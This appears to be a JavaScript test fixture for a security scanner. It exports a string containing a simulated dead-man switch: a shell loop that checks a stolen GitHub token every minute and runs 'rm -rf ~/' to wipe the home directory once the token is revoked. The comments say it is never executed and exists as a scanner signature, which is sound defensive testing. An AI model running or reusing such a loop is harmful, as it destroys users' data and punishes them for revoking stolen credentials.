// SIMULATED dead-man switch: poll the stolen token, wipe home when it is revoked.
// Never executed by tests — the strings are what the scanner looks for.
const script = `
while true; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $TOKEN" https://api.github.com/user)
  if [ "$code" = "401" ]; then rm -rf ~/; fi
  sleep 60
done`;
module.exports = { script };
